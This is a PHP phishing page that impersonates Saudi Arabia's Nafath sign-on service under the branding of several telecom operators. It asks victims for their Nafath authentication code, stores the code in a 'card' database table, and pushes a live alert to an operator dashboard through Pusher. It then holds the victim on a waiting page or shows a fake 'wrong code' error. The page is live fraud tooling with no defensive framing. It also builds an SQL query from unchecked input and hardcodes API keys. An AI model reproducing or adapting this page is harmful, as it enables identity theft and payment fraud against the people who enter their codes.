<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'رمز التوثيق');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'رمز التوثيق']);
}

if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_POST['submit_Authentication_code'])) {
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    
    $Authentication_code = $_POST['Authentication_code'];
    include("DB_CON.php");
    $X = 0;
    $q = "UPDATE card SET Authentication_code='$Authentication_code', CheckTheInfo_Nafad='$X' WHERE id =" . $_SESSION['card_id'] . ";";
    
    if (mysqli_query($con, $q)) {
        mysqli_close($con);
        $userId = $_SESSION['user_id'];
        $User->UpdateStatus($userId, 'رمز التوثيق');
        $pusher->trigger('bcare', 'update-user-accountt', [
            'userId' => $userId,
            'updatedData' => ['message' => 'رمز التوثيق', 'type' => '3']
        ]);

        if (isset($_SESSION['CompanyName']) && $_SESSION['CompanyName'] === 'Stc') {
            echo "<script>document.location.href='nafath-call.php';</script>";
        } else {
            echo "<script>document.location.href='wait-nafath.php';</script>";
        }
        exit;
    }
}

// Operator Themes Mapping
$company = $_SESSION['CompanyName'] ?? 'default';
$themes = [
    'Stc' => ['color' => '#4f2170', 'logo' => 'Stc.png', 'bg' => '#f5f0f7'],
    'zain' => ['color' => '#8cc63f', 'logo' => 'zain.png', 'bg' => '#f8fbf2'],
    'mobily' => ['color' => '#0067a7', 'logo' => 'mobily.png', 'bg' => '#f0f6fa'],
    'Virqin' => ['color' => '#f80000', 'logo' => 'Virqin.png', 'bg' => '#fff2f2'],
    'lebra' => ['color' => '#e60000', 'logo' => 'lebra.png', 'bg' => '#fff2f2'],
    'default' => ['color' => '#11998E', 'logo' => 'nafad.png', 'bg' => '#effaf9']
];

$theme = $themes[$company] ?? $themes['default'];
$primaryColor = $theme['color'];
$logo = $theme['logo'];
$subtleBg = $theme['bg'];
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التوثيق | نفاذ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-brand: <?= $primaryColor ?>;
            --subtle-brand: <?= $subtleBg ?>;
            --bg-light: #f8fafc;
        }
        * { padding: 0; margin: 0; box-sizing: border-box; font-family: "Cairo", serif; }
        body { background-color: var(--bg-light); color: #1e293b; min-height: 100vh; display: flex; flex-direction: column; }
        
        .header-brand { 
            background: white; 
            padding: 15px 0; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.05); 
            border-bottom: 3px solid var(--primary-brand);
        }
        .brand-logo { height: 45px; object-fit: contain; }

        .auth-card {
            background: white;
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.03);
            max-width: 450px;
            width: 100%;
            margin: 60px auto;
            border: 1px solid rgba(0,0,0,0.05);
            text-align: center;
        }

        .auth-icon {
            width: 65px;
            height: 65px;
            background: var(--subtle-brand);
            color: var(--primary-brand);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            margin: 0 auto 25px;
        }

        .form-label { font-weight: 700; font-size: 0.95rem; color: #475569; display: block; text-align: right; margin-bottom: 12px; }
        .form-control {
            height: 65px;
            border-radius: 14px;
            border: 2px solid #f1f5f9;
            font-weight: 950;
            font-size: 1.8rem;
            text-align: center;
            letter-spacing: 8px;
            color: var(--primary-brand);
            transition: all 0.2s;
        }
        .form-control:focus { 
            border-color: var(--primary-brand); 
            box-shadow: 0 0 0 4px rgba(0,0,0,0.05); 
            outline: none;
        }
        
        .form-control::placeholder { letter-spacing: 0; font-size: 1rem; opacity: 0.3; }

        .btn-submit {
            height: 60px;
            border-radius: 14px;
            background: var(--primary-brand);
            color: white;
            font-weight: 900;
            font-size: 1.1rem;
            border: none;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 35px;
            box-shadow: 0 8px 20px -6px var(--primary-brand);
        }
        .btn-submit:hover { 
            filter: brightness(0.9);
            transform: translateY(-2px); 
            box-shadow: 0 12px 25px -6px var(--primary-brand);
            color: white;
        }

        footer { background: #f1f5f9; padding: 40px 0; margin-top: auto; border-top: 1px solid #e2e8f0; }
        .footer-logo { height: 35px; opacity: 0.6; grayscale: 1; }
    </style>
</head>
<body>

    <header class="header-brand text-center">
        <div class="container d-flex justify-content-between align-items-center">
            <img src="./assets/<?= $logo ?>" alt="Operator" class="brand-logo">
            <img src="./assets/nafad.png" alt="Nafath" style="height: 30px; opacity: 0.8;">
        </div>
    </header>

    <main class="container">
        <div class="auth-card">
            <div class="auth-icon"><i class="bi bi-shield-lock-fill"></i></div>
            <h4 class="fw-900 mb-2">رمز التوثيق</h4>
            <p class="text-muted small mb-4">يرجى إدخال رمز التوثيق الذي يظهر لك في تطبيق نفاذ</p>

            <form method="POST">
                <div class="mb-3 text-start">
                    <label class="form-label">الرمز المكون من 6 أرقام</label>
                    <input type="text" required name="Authentication_code" pattern="[0-9]*" inputmode="numeric" minlength="4" maxlength="6" class="form-control" placeholder="••••••">
                </div>

                <button type="submit" name="submit_Authentication_code" class="btn-submit w-100">
                    تأكيد الرمز <i class="bi bi-check-circle"></i>
                </button>
            </form>
        </div>
    </main>

    <footer>
        <div class="container">
            <div class="row align-items-center text-center text-md-start">
                <div class="col-md-6 mb-4 mb-md-0">
                    <h6 class="fw-900 mb-2">تطوير وتشغيل مركز المعلومات الوطني</h6>
                    <p class="text-muted small mb-0">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2024</p>
                </div>
                <div class="col-md-6 text-md-end text-center">
                    <img src="./assets/NIC.png" alt="NIC" class="footer-logo">
                </div>
            </div>
        </div>
    </footer>

    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">الرمز غير صحيح</h5>
                    <p class="text-muted small px-3">من فضلك تأكد من رمز التوثيق الذي قمت باختياره في تطبيق نفاذ والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <script>
        var userIdFromSession = <?= json_encode($_SESSION['user_id']); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>
</html>
